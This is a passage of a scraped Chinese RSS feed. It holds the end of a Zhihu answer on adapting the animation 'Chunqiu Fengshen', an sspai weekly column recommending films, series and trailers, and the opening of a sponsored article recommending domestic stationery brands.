当然以上所展示的只是整部作品诞生过程中的一小部分环节。相对于制作流程，我更想跟大家聊的是创作心得。《春秋封神》是一部漫改作品，这部作品动画化的改编难度还是比较高的，原著的故事很精彩，但是述事的风格相对比较碎片化，并且是双线述事，观感上对于漫画来说问题不大，但对于如何梳理出适合动画节奏的主线，又能照顾到原著粉的情怀，就成了我们最初所面临的最大困难。在立项之初，我们比较坚定的一点就是，既然是改编，那么我们必须得做到尊重原著，在忠于原著的前提下，充分保留原著精华，去强化原著中的戏剧冲突，在思考如何将子殇、韩箕、小姒、幽王这些角色的命运纠葛展现得更深刻，将角色塑造得更为深入人心等方面，我们作了不少思考。同时，这部作品的背景设定很庞大，整个世界由天界、人界、妖界等力量体系构筑，为了让故事形成逻辑自洽的剧情脉络，又能更好地展现每一个角色的心路变化和成长历程，我们选择规避了会容易造成审美疲劳的爽文固有模式，更加注重着墨于不同主角内心的蜕变与成长，抛开固有的主角“打怪升级谈恋爱”套路，以双视角去讲述人世间的风风雨雨，爱恨情仇，引领观众一同感受角色们的冒险历程，而随着剧情的进展，观众会更加详细地了解到整个世界观，并且去认识每一个角色，为此这部作品可能会相对慢热，观众可以期待当所有线索并联时，最终汇聚成一点的时候的爆发力。</p>\n<p>《春秋封神》目前还在爱奇艺周更中，暑期还特别开启了周双更福利。希望更多的观众能够关注到这部作品，感谢。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jiahao-83-48?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">jiahao</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477793717/answer/2056504454?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">4 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/471142455?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">话题：如何评价《春秋封神》动画？</a><br><a href=\"http://www.zhihu.com/question/392443599?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待曾承诺全本免费的国漫《战国千年》因人气暴增开始收费的行为？</a><br>\n","link":"http://www.zhihu.com/question/477793717/answer/2056504454?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"本周看什么丨最近值得一看的 8 部作品","date":"2021-08-13 10:33:41","description":"\n<h2>🎁 栏目更新</h2>\n<p>1895 年 12 月 28 日，在巴黎卡普辛路 14 号的大咖啡馆，历史上最著名的一场电影放映出现了 —— 卢米埃尔兄弟的一系列短片和其他演出一起成为了咖啡馆的助兴节目，而咖啡馆也正是那时人们谈论电影和艺术的重要场所。</p>\n<p>「看什么 Café」作为「本周看什么」栏目的衍生，就是想为热爱影视艺术的少数派们创造这样一个氛围，虽然我们无法回到电影诞生的那个年代，但我们依旧可以喝着咖啡，深入探讨有关影视艺术的一切。</p>\n<p>本周日「看什么 Café」将迎来第 1 篇更新，和大家一起探讨《<a href=\"https://sspai.com/post/68175\" target=\"_blank\">当我们聊「电影感」的时候，我们在聊些什么？</a>》。届时欢迎在大家评论区留言讨论，我们将抽取 1 条优质评论送上少数派周边一份 🎁！</p>\n<hr>\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[电影] 新·福音战士剧场版：终、[台剧] 俗女养成记 2、[电影] X 特遣队：全员集结、[纪录片] Catch and Kill: The Podcast Tapes、[国产剧] 理想之城、[电影] 浪客剑心 最终章 The Final / The Beginning、[台剧] 池塘怪谈、[美剧] 假如…？</li>\n<li>几则精彩预告：漫改 TV 动画《JOJO 的奇妙冒险 石之海》公布预告、衍生动画电影《猎魔人：狼之噩梦》发布新正式预告、Netflix 发布原创剧集《怪奇物语 》第四季全新预告、李政宰主演 Netflix 新剧《鱿鱼游戏》9 月 17 日上线</li>\n<li>几则影视资讯：丹尼斯·维伦纽瓦执导新版《沙丘》发布正式海报、动画电影《大鱼海棠贰》正式立项、皮克斯《夏日友晴天》内地定档 8 月 20 日、《四叠半时光机》将改编为动画、腾讯视频公开旗下 104 部动画企划</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[电影] 新·福音战士剧场版：终</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/article/53f5cf550b9d0a3a16c816a26d3d3390\"></figure><p>关键词：剧情 / 科幻 / 战斗</p>\n<p>片长：155 分钟</p>\n<p>观看渠道：<a href=\"https://www.amazon.co.jp/dp/B098T4QYZ3\">Amazon Prime Video 日本</a> / <a href=\"https://www.amazon.com/dp/B098WNZSQ3\">全球</a>；<a href=\"https://movie.douban.com/subject/10428501/\">豆瓣链接</a></p>\n<blockquote><p>再见，谢谢所有的福音战士。</p></blockquote>\n<p>@SHY：26 年前，一部名为《新世纪福音战士》的动画横空出世，掀起全世界范围内的讨论热潮，一手缔造了日本动画的又一黄金时期，改变了整个业界的制作方向。港台两地先后引进后，20 年前，它以《新世纪天鹰战士》的面貌亮相深圳电视台，成为不少国内孩子的童年回忆。14 年前，由 TV 版再构筑的《福音战士新剧场版：序》上映，拉开了全新篇章的帷幕。而今，曾在电视上收看 EVA 的少年少女早已长大成人，《新·福音战士剧场版：终》也为整个系列画上终止符，是道别的时候了。</p>\n<p>跨过死与新生，献上真心为你，《新·福音战士剧场版：终》迎来了登场角色们的个人成长与最终和解。最后的战斗后，真嗣与源堂、明日香、薰、丽面对面长谈，袒露心意，解开心结，补完一切。这位接纳了所有人的少年，终于接纳了自己，创造了不再有福音战士的新世纪。当《One Last Kiss》的旋律响起，真嗣与玛丽手牵手跑出车站，虚拟与现实的界限逐渐模糊，过往的痛苦也成了面向未来的祝福。这或许不会是所有人都满意的结局，却是 EVA 系列最温柔的句点，消解了我的所有不快。</p>\n<p>迎来「和解」的，除了剧中人，或许还包括幕后的制作人员与银幕外的观众。福音战士的诅咒将驾驶员们禁锢在过去的躯壳中，EVA 的成功也将一众主创牢牢绑定在作品周围。庵野秀明曾试图逃离 EVA，却无法摆脱其阴影，在《新·福音战士剧场版：终》里，这位曾愤世嫉俗的青年终于放下芥蒂，与曾经的自己诀别；历经十五年时光，Khara 才华横溢的动画人们也从 EVA 中解放，站上全新的起点。不再逃避，面对现实，喜欢 EVA 的少年在此刻长大成人，是时候向前进发了。</p>\n<p>さらば、全てのエヴァンゲリオン。</p>\n<h3>[台剧] 俗女养成记 2</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/article/0a4f34fae8f1a02123e54c890b80cd40\"></figure><p>关键词：剧情 / 喜剧</p>\n<p>片长：45 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/35215517/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：40 岁的陈嘉玲带着豆瓣 9.6 高分的剧集回来了！第一季中，她结束了一段即将迈入婚姻的关系，辞掉了在台北打拼很久才得到的董事助理的工作，回到老家台南买了一个鬼屋，准备用全新的面貌迎接自己的人生下半场生活。</p>\n<p>这部剧惹大家喜欢的原因之一在于它接地气，我们无时无刻都能透过陈嘉玲的生活看到自己的过去、现在和未来。它探讨在人生历程上不想「掉队」又疲惫得难以支撑感情生活的话题；它勾画三代女性人生，而摆在当下年轻人眼前的命题是大城市与故乡的抉择；它同时摒弃了以往剧中把爱情作为人生救赎的解决方案，而是让「俗女」完全地接纳自己，与自己和解。</p>\n<p>这一季回到台南的陈嘉玲与家庭戏份变重了，更有人情味，也更令人感动，客串的天心和旺福乐队也给我们惊喜，这一季甚至比上一季还要好看，感兴趣的朋友一定要从第一季补起啊。</p>\n<h3>[电影] X 特遣队：全员集结</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/59dae2a7df0cd02ce0e3b6cd7210c5d0.png\"></figure><p>关键词：喜剧 / 动作 / 科幻</p>\n<p>片长：132 分钟；<a href=\"https://movie.douban.com/subject/26741632/\">豆瓣链接</a></p>\n<blockquote><p>请问鲨鱼王可以和隔壁格鲁特一起拍个短剧吗？</p></blockquote>\n<p>@潘誉晗：被关在监狱的自杀小队为了获得减刑机会接受了一项新的任务，可当他们到达目的地，却因为内鬼被敌军弄得几乎全军覆没。而更令他们没有想到的是，其实他们这一次「炮灰小队」存在的意义，就是为了给 X 特遣队机会——他们才是这次任务的真正执行人。</p>\n<p>一次非常爽快地观影体验，比《自杀小队》更暴力、更刺激、也更搞笑。全员恶人的设定，在片中角色自带喜剧的效果下带来了更棒的娱乐性，在一次又一次的反套路中不断被惊喜到，可能前一秒还在想好可惜怎么是这样的情况，结果下一秒的反转就让人忍不住捧腹大笑。新人物的特点和人设都很有趣，玛格特·罗比回归饰演的哈莉·奎茵依旧让我们看到了哥谭「疯批美人」的魅力，她穿着红色公主裙大开杀戒的几场动作戏完成得相当漂亮。另外，无论是伊德里斯·艾尔巴，还是约翰·塞纳，都为我们呈现了与以往很不一样的硬汉形象，尤其是由史泰龙配音的鲨鱼王，更是带来了这部影片最大的亮点、萌点和看点。</p>\n<h3>[纪录片] Catch and Kill: The Podcast Tapes</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/article/71a476d9bb2f2414484a8183a1e5301f\"></figure><p>关键词：性侵 / 新闻调查</p>\n<p>片长：约 30 分钟（单集）× 6 集</p>\n<p>观看渠道：<a href=\"https://www.hbo.com/catch-and-kill-the-podcast-tapes\">HBO</a>；<a href=\"https://movie.douban.com/subject/35495656/\">豆瓣链接</a></p>\n<blockquote><p>真相也许会迟到，但绝不应该缺席。</p></blockquote>\n<p>@宽治：因报道好莱坞大亨哈维·韦恩斯坦性侵事件而获得普利策奖的新闻记者罗南·法罗，在根据这一事件创作了<a href=\"https://www.newyorker.com/news/news-desk/from-aggressive-overtures-to-sexual-assault-harvey-weinsteins-accusers-tell-their-stories\">一篇文章</a>、<a href=\"https://book.douban.com/subject/34790851/\">一本书</a>、<a href=\"https://podcasts.apple.com/gb/podcast/the-catch-and-kill-podcast-with-ronan-farrow/id1487730212\">一档播客节目</a>之后，又与 HBO 合作推出了这部纪录片。虽然这些作品的核心内容是类似的，但纪录片这种媒介还是给我们提供了一种不同的叙事与理解的方式，也让我们更加直观地了解到更多的事实与细节。</p>\n<p>对于不少人来说，也许这些故事及其所透露的人性之恶是不可思议的，但却曾真实地发生过（并仍在发生）。「韦恩斯坦案」激发了 #MeToo 运动在美国的发展，并最终成功地让韦恩斯坦受到了法律的处罚，算是一个难得的「善终」案例，加上法罗本身优秀的采访技巧与表达能力，也让这部纪录片具有了某种特别的参考意义。我们在片中不仅可以看到第一手的调查材料，还可以了解事实是如何被确立与定性的，它告诉我们，对性犯罪的反抗，仅仅依靠运动式的揭发检举是远远不够的，在追求真相与正义的道路上，我们必须要有可以与罪恶抗衡的社会力量（正直的媒体也许算是一例）以及更加完善且负责的公共机构。</p>\n<h3>[国产剧] 理想之城</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/article/f1ad6abea2dd964d5e2d7998cbff9d4e\"></figure><p>关键词：剧情</p>\n<p>片长：45 分钟（单集）× 40 集；<a href=\"https://movie.douban.com/subject/35047559/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：孙俪一年一部剧的指标给了这部《理想之城》，剧中饰演建筑行业中的一名造价师。又是一部类似《安家》的职场剧，又是一个像房似锦一般倔强、坚强、有能力但情商并不很在线的职场人。</p>\n<p>剧集一开始，由孙俪饰演的苏筱就经历失业失恋双重打击——工作中认真负责的她因合作方推诿被迫离职，像极了社会新闻中动不动就被推出来背锅的「临时工」；意外发现婚期将至、一心追求体制内晋升的男友做着令她作呕的事情。</p>\n<p>这部剧并不是大女主职场爽剧，根据已经播出的六集剧情来看，建筑行业群像戏也是一个亮点，造价单不只是工程单，上到工程项目招投标，下到建筑工人讨要工资，也是一张关系网，而职场上的暗流涌动与心理攻防战真实又紧张，于和伟和赵又廷的角色是老狐狸和小狐狸的博弈，非常精彩。</p>\n<p>P.S. 有些朋友吐槽该剧行业知识做得极为不专业，但它并不是一个专业的职场说明书，作为行业外的普通观众，我们在乎的是职场上人与人的对抗碰撞，不必太苛刻。</p>\n<h3>[电影] 浪客剑心 最终章 The Final / The Beginning</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/article/4d734937302472dce192177d7affa133\"></figure><p>关键词：漫画改 / 剧情 / 动作 / 冒险</p>\n<p>追忆篇 The Beginning：137 分钟；<a href=\"https://www.netflix.com/title/81313229\">Netflix</a>；<a href=\"https://movie.douban.com/subject/33407124/\">豆瓣链接</a></p>\n<p>人诛篇 The Final：132 分钟；<a href=\"https://www.netflix.com/title/81313227\">Netflix</a>；<a href=\"https://movie.douban.com/subject/30167974/\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://manga.bilibili.com/detail/mc24766\">哔哩哔哩漫画</a> / <a href=\"https://ac.qq.com/Comic/ComicInfo/id/544936\">腾讯动漫</a></p>\n<blockquote><p>剑乃凶器，剑术是杀人的伎俩。</p></blockquote>\n<p>@SHY：1999 年发行的《<a href=\"https://movie.douban.com/subject/1421721/\">浪客剑心 追忆篇</a>》OVA，无疑是日本动画的巅峰之作，超越原著的少年漫格局，将个人悲剧与时代洪流融合，以因果式的四幕结构诉说绯村剑心与雪代巴之间刻骨铭心的爱恨情仇，凄美而壮绝，在我心中永远占据一席之地。正因如此，当《浪客剑心》电影系列推进到这里时，我的心情相当复杂。虽然大友启史执导的《浪客剑心》一向被誉为漫改真人影视标杆，凭借较高的还原度、扎实的布景考据与出彩的动作设计博得众多好评，但《追忆篇》是以文戏见长，如何平衡白梅幽香与腥风血雨，同时与动画做出差异，是主创必须考虑的问题。</p>\n<p>从结果来看，《浪客剑心 最终章 追忆篇》称得上中规中矩、有亮点的改编，动作戏自不必说，尚未换上逆刃的剑心拔刀后招招见血，铸就了系列最具冲击力的打斗场面；文戏的几处改动也能看出导演的心思，如桂希望巴不要令剑心变钝，巴却主动提出成为剑心的刀鞘，两人的形象皆更丰满。关于标志性的十字伤，漫画、动画与电影选择了三种不同演绎，值得仔细品味，在此不多剧透。作为前传，《追忆篇》结尾接上了 2012 年电影初作中的镜头，同时与《人诛篇》最后剑心为巴扫墓相照应，既是起始，又是终焉，为《浪客剑心》系列画上了圆满的句点。</p>\n<h3>[台剧] 池塘怪谈</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/article/d588bdf996318f38b0976332bb331a8c\"></figure><p>关键词：喜剧 / 悬疑 / 恐怖 / 奇幻</p>\n<p>片长：10 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/35436167/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：这是《缉魂》导演程伟豪的首部短剧作品，也是与吴青峰、魚丁糸的一次跨界合作，在魚丁糸新专辑《池堂怪谈》上线的同时，《池塘怪谈》也首播了。这部剧仍是导演程伟豪偏爱的烧脑悬疑题材，但多了份青春味道。</p>\n<p>故事从一场车上均为未成年的车祸开始，高中生小鱼跌入池塘后回到了他不想回忆起的过去，究竟是他在濒死边缘灵魂出窍，还是进入了平行宇宙的穿越时空？对小雨来说女神般存在的阿妮和好兄弟阿丁之间的秘密也一点点出现在他面前。当小鱼再次回到这个充满奇幻怪诞氛围的池塘，不知道迎接他的是与朋友的温暖重逢，还是更多不为人知的秘密……</p>\n<p>剧中故事发生在 2004 年，不管是画面色调还是剧中如老式电脑、传纸条这样的细节都让人闪回零几年，吴青峰也一直贯穿在剧中，比如出现在书包里的一张手写信写着苏打绿《小情歌》的歌词。每集的片尾有《池堂怪谈》收录的十首歌，从而串联起这五个高中生的故事，值得一看。</p>\n<h3>[美剧] 假如…？</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/article/86a2bf797b74bd485cd96b9270273787\"></figure><p>关键词：动画 / 动作 / 奇幻</p>\n<p>片长：32 分钟（单集）× 9 集；<a href=\"https://movie.douban.com/subject/33408073/\">豆瓣链接</a></p>\n<blockquote><p>从今天起，姑娘也可以这样战斗了。</p></blockquote>\n<p>@潘誉晗：虽然本剧周三才上映，但迅速升至「烂番茄」最新剧集排行榜榜单的第二名，很好地说明了漫威在影迷们中的号召力，尤其是电影演员全员回归配音也为这部动画带来了很大的惊喜。虽然一集的时长只有短短半小时，但是，漫威在这一次的动画尝试上依然带来了不小的脑洞：如果最后卡特成为了美国队长、史蒂夫先变成了钢铁侠……那么这个世界会不会因此变得不一样？</p>\n<p>许多观众表示，首集看下来的第一感觉就是之前的期待没有被辜负。大概是因为动画的原因，本剧在动作戏的设计上多了一份「野心」，队长卡特在暴打敌人时的流畅感，还有她作为女性队长的自信，都让人在屏幕前切实感受到了一种很强大的安全感，加上这几年许多影视剧都会涉及到女性力量的崛起，本剧第一集确实给了不少女粉丝力量。也许，漫威宇宙的「假如」可以给大家带来无限的可能性。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/35307474/\">[韩剧] 警察学院</a> @潘誉晗：本以为是青春校园风格的剧集，可随着剧情推进到第二集，观众也在这部笑泪与共的剧集中发现了隐藏剧情——原来警察学院中还有内鬼。两集下来的观感很不错，虽然定位是喜剧，但并没有刻意地搞笑。在反套路的幽默中，我们可以看到父子情深和兄弟互相扶持的情谊，推荐。</p>\n<p><a href=\"https://movie.douban.com/subject/35438008/\">[纪录片] 再见了所有的福音战士！庵野秀明的 1214 日</a> @SHY：此前推荐过的《<a href=\"https://movie.douban.com/subject/35400332/\">行家本色：庵野秀明</a>》的加长特别版，或许应该叫庵野秀明的导演剪辑版，全片经过重新梳理，叙事脉络完全不同，补充了众多新镜头，删去多余的旁白，整体风格更加严肃。看过《新·福音战士剧场版：终》后，你会发现，纪录片的内核与其高度一致，补完了影片幕后的创作者思路，是理解 EVA 正作的绝佳素材，推荐一并食用。</p>\n<p><a href=\"https://movie.douban.com/subject/35202369/\">[英剧] 古宅老友记 第三季</a> @潘誉晗：本以为换了导演会「水土不服」，可令人欣喜的是，新导演和剧本依然维持了高水准，甚至在剧情的节奏和画面的镜头感上呈现出了比第二季更棒的效果。年轻的夫妻和来自不同时代、吵吵闹闹的鬼的同居生活，跨越不同种族的温情与治愈。每一个鬼都有故事，每一个鬼都很可爱。</p>\n<p><a href=\"https://movie.douban.com/subject/35426419/\">[电影] 剧场编集版 隐瞒之事 -秘密是什么-</a> @SHY：去年推荐过的 <a href=\"https://movie.douban.com/subject/34909367/\">TV 动画</a> 的剧场总集篇，相较于原版，主要改动是圆上了母亲的相关故事，点明小姬的职业抉择，以及最后增加的两分钟新剧情，弥补了动画和漫画未能同步完结造成的遗憾。囿于篇幅限制，电影删去了众多日常桥段，重点刻画主线剧情，节奏略赶，对新观众可能不太友好，但仍能触及人心中最柔软的部分，推荐看过 TV 版的同学直接跳到结局。</p>\n<p><a href=\"https://movie.douban.com/subject/34984521/\">[电影] 银魂 THE FINAL</a> @SHY：挺多人愿以一生节操换取永不完结的《银魂》，终究是以有些不体面的方式完结了，改编自原作完结篇的最终剧场版，也磕磕绊绊地上映了。依然是熟悉的配方，开场先以戏仿《龙珠》的形式来一段前情提要，中间是明显缺乏经费的最终战，了却所有人的心结，最后回归日常，情怀拉满，顺带塞入吐槽若干。非常粉丝向的电影，推荐粉丝观看。（废话）</p>\n<p><a href=\"https://movie.douban.com/subject/3692602/\">[电影] 丛林奇航</a> @潘誉晗：把迪士尼的「森林河流之旅」改编成这样一个故事，从商业片的角度上来看是相当成功的，甚至可以想起自己在迪士尼玩项目时的心情，也是一次很棒的安利。巨石强森和艾米莉·布朗特这样的搭配很棒，代表着力量的船长还有聪慧机智的英伦女士，一部典型的丛林探险电影，适合全家欢。</p>\n<h2>📅 本周新预告</h2>\n<h3>漫改 TV 动画《JOJO 的奇妙冒险 石之海》公布预告</h3> <p>8 月 8 日，TV 动画《JOJO 的奇妙冒险 石之海》公布了海报、预告及主创阵容，铃木健一担任总导演，加藤敏幸执导，david production 制作，2021 年 12 月独家上线 Netflix，2022 年 1 月正式开始播出。本作改编自荒木飞吕彦的同名漫画，空条承太郎的女儿空条徐伦被陷害入狱，借助父亲的护身符获得替身能力。</p>\n<h3>衍生动画电影《猎魔人：狼之噩梦》发布新正式预告</h3> <p>8 月 9 日，动画电影《猎魔人：狼之噩梦》正式预告公开。将以维瑟米尔为主角讲述《猎魔人》世界观下的故事，8 月 23 日上线网飞。</p>\n<h3>Netflix 发布原创剧集《怪奇物语 》第四季全新预告</h3> <p>《怪奇物语 Stranger Things》第四季全新先导预告发布，确定将于 2022 年第二季度上线。</p>\n<h3>李政宰主演 Netflix 新剧《鱿鱼游戏》9 月 17 日上线</h3> <p>8 月 11 日，由《熔炉》导演黄东赫执导，李政宰、朴海秀、许成泰、魏化俊、金周灵、郑浩妍主演，孔刘特别出演的剧集《鱿鱼游戏》发布先导预告。该剧将于 9 月 17 日 Netflix 独家上线。@甜約翰</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1oL411E7Nt?from=search&amp;seid=16299357682798534208\" target=\"_blank\"><strong>埃斯基尔·沃格特自编自导新片《无辜者》首曝预告：</strong></a>《盲视》导演埃斯基尔·沃格特自编自导的电影《无辜者》发布首支预告。该片由艾伦·多丽特·彼得森、雷克·雷诺拉·弗洛特姆等主演，将于 9 月 3 日挪威上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1ry4y1L7JY?from=search&amp;seid=10821422704444603156\" target=\"_blank\"><strong>藤原龙也、松山研一主演电影《噪音》发布特报映像：</strong></a>改编自筒井哲也的同名漫画，由藤原龙也、松山研一和神木隆之介主演的新作《噪音》发布预告， 本片将于 2022 年 1 月 28 日上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1zP4y1W7LX?from=search&amp;seid=3731350716017217088\" target=\"_blank\"><strong>灾难片《无限深度》改名《峰爆》，发布预告宣布定档 9 月 17 日：</strong></a>由李骏执导，朱一龙、黄志忠、陈数、焦俊艳、成泰燊、王戈、卢思宇、张译、白客、乔欣等出演的灾难片《无限深度》正式改名《峰爆》，同时发布预告宣布定档 9 月 17 日，锁定中秋档。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Lf4y1V7EJ?from=search&amp;seid=5294064576168240834\" target=\"_blank\"><strong>北野武个人传记《浅草小子》发布先导预告，将于 12 月 9 日上线：</strong></a>《浅草小子》发布预告，本片改编自北野武同名自传，由柳乐优弥饰演北野武、大泉洋 饰演其师傅深见千三郎。讲述昭和 40 年代的东京浅草，北野武师从深见千三郎后的传奇演艺生涯，影片将在 12 月 9 日上线 Netflix。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>丹尼斯·维伦纽瓦执导新版《沙丘》发布正式海报</h3>\n<p>8 月 10 日，根据弗兰克·赫伯特小说改编，由丹尼斯·维伦纽瓦执导的新版《沙丘》发布正式海报。影片卡司包括蒂莫西·柴勒梅德、丽贝卡·弗格森、奥斯卡·伊萨克、乔什·布洛林、赞达亚、杰森·莫玛、哈维尔·巴登、斯特兰·斯卡斯加德、戴夫·巴蒂斯塔、夏洛特·兰普林、张震等。该片将于 10 月 22 日同步登陆北美院线及 HBO Max，并确认引进中国内地。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/13/article/9a6b3407f0b0caf372de47ef5642c111\"></figure><h3>动画电影《大鱼海棠贰》正式立项</h3>\n<p>动画电影《大鱼海棠贰》正式立项，第一部导演、编剧梁旋继续操刀剧本。故事讲述湫被灵婆复活，正式成为如升楼新任北斗。在履行职责的过程中湫结识了一位少年。两人一起同行，却卷入了这个世界的一场灾难后命运交融的故事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/article/c58c3d102c1e4052f0f2fb32b2573b7c\"></figure><h3>皮克斯《夏日友晴天》内地定档 8 月 20 日</h3>\n<p>皮克斯出品的动画电影《夏日友晴天》宣布内地定档 8 月 20 日。本作由埃里康·卡萨罗萨执导，在意大利里维埃拉海岸，小男孩卢卡与新结交的好友们一起渡过了难忘的夏天，尽情享受冰淇淋、意面和摩托车旅行。但这些乐趣都受到一个秘密的威胁：卢卡并非人类，而是来自水底世界的海怪。</p> <h3>《四叠半时光机》将改编为动画</h3>\n<p>8 月 12 日，森见登美彦根据上田城剧本《夏日时光机》创作的《四叠半神话大系》后传小说《四叠半时光机》宣布将改编为动画，上田城编剧，夏目真悟执导，Science SARU 制作，形式及档期待定。面对突然出现的时光机，「我」决定回到昨天找到空调遥控器，却引发了世界毁灭的危机，和明石的恋情也迎来转折。 <a href=\"https://twitter.com/4andahalf_tmb/status/1425653266097057797\" target=\"_blank\">来源</a></p>\n<h3>腾讯视频公开旗下 104 部动画企划</h3>\n<p>8 月 8 日，腾讯视频举办了 2021 动漫年度发布会，公开了旗下 104 部动画新作。《笑傲江湖》《绝代双骄》《镖人》《龙族》《诛仙》《诡秘之主》等知名 IP 将首次改编为动画；《大理寺日志》《狐妖小红娘》《一人之下》等动画将继续制作续集；还包括《玲珑山》《灯笼刀》《TAISU project》等风格迥异的原创动画项目。 <a href=\"https://weibo.com/3889146127/KsuwopTzb\" target=\"_blank\">来源</a></p>\n<h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/13/fa3d2549c19040049c19ed343fd71999.png\"></figure><p>本期彩蛋是由中奖读者 <a class=\"ss-atUser\" data-mention=\"@sphao\" user-id=\"bsv2smdb34tfr0651g1g\" href=\"https://sspai.com/u/g93fpr90\">@sphao</a> 提供的「看图猜电影」，首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」），和我们不定期发放的奖品。本期猜中的「第一名」将会在这篇文章中更新，届时也请各位参与互动的朋友注意站内私信~</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/68259"},{"title":"国物馆 | 就算再不用写作业你也应该知道的好用文具","date":"2021-08-13 08:55:17","description":"\n<h4><strong>编者注：</strong></h4>\n<p>在对消费者需求不断探索与「为国民，造好物」品牌理念的加持下，<a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 将现代年轻消费者的个性心理与传统文化巧妙结合，力求为大家带来更多时尚、潮流、有现代科技感、技术应用快人一步、高品质且价格友好的产品——而有着与之相同愿景的国货品牌亦不胜枚举。</p>\n<p>我们支持国际化潮流并主张消费自由，但不少平价好用的国货同时也正在被生生埋没，成为你购物车中不曾有过的遗珠之憾。于是少数派联合我们的好朋友 <a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 一起开启了这次国货推荐的征文活动，邀请了一些作者来分享他们使用下来认为不错的国货，在予你受用的同时也希望借此机会让更多的国货被看见。如果你也有心仪的国货想要推荐，非常欢迎你向我们投稿。</p>\n<hr>\n<p>之前我写过一些关于文具推荐的文章，但是有一些朋友和我交流说，觉得一些进口文具价格比较高，对于学生党来说日常用会有一些负担。虽然我也提及了一些国产的物美价廉的文具品牌，但是我没有特别详细地推荐过。所以这篇想和大家分享一下，我使用过的好用国产文具，也希望大家可以关注到身边的好用的国产文具品牌，当然更希望会有更多更多优秀的国产品牌出现。</p>\n<p>以下都是我的个人观点，欢迎各位朋友在评论区和我讨论，也欢迎大家分享喜欢的国产文具品牌。</p>\n<h2>点石</h2>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/07/article/6a21d45a793782373824d5ad9cb920ae\"></figure><p>关于点石，我在之前的文章中推荐过其中一款中性笔。但是我并没有非常细致地展开说，这次要分享关于国货的品牌，我第一时间想到了它。<strong>它的品控相对来说比较稳定</strong>，而且价格也比较友好。没有活动的时候，一支中性笔大约是 2 元到 3 元之间。遇上活动或者有优惠的时候，折合下来大约 1 元到 2 元一支笔。对于学生党来说，在有折扣的时候大量购买是比较划算的。并且点石也推出了考试套装以及学生用笔组合推荐，可以买一个套装回来试一试哪支最适合自己。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img 